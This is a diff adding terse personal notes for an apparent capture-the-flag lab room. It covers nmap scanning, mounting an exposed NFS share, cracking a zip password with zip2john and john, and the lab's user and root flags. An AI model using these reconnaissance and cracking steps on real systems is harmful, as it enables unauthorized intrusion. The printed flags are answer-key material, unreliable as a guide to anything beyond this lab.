@@ -1,0 +1,48 @@
+export IP=10.10.46.54
+
+nmap -sV -sC $IP
+
+this is what we got from 1337 - with a connection reset
+
+Welcome traveller, to the beginning of your journey
+To begin, find the trollface
+Legend says he's hiding in the first 100 ports
+Try printing the banners from the ports
+
+this says first 100 ports, so lets do that, later we can run a full scan? maybe
+
+82 proftpd
+78  Sun GlassFish Enterprise Server v71471
+70 TeamSpeak 2 - Server-Administration</title>
+58  Novell-HTTP-Server/BGXSoMWMN
+68  ?SH-2.0-0.0 
+56 Allow: GET,HEAD,POST,OPTIONS
+
+so nfs is port 12345
+on running nmap on this prt with nfs scripts
+
+nmap -p 12345 -A --script nfs* $IP - this says nfs is on default port
+nmap -p 111 -A --script nfs* $IP
+
+111/tcp open  rpcbind 2-4 (RPC #100000)
+| nfs-showmount: 
+|_  /home/nfs *
+
+now
+sudo mount $IP:/home/nfs/ /home/srini/notes/thmrooms/serverfromhell/mountdir
+
+now we have a zip file backup.zip => which has password
+
+locate zip2john
+
+/usr/bin/zip2john backup.zip -o home/hades/.ssh/flag.txt => put this into random_hash
+john --wordlist=/usr/share/wordlists/rockyou.txt random_hash => zxcvbnm
+
+hint.txt says 2500-4500
+sudo nmap -sS -sV -p2500-4500 -A $IP
+
+port is 3333
+
+hades user.txt thm{sh3ll_3c4p3_15_v3ry_1337}
+
+root.txt thm{w0w_n1c3_3sc4l4t10n}
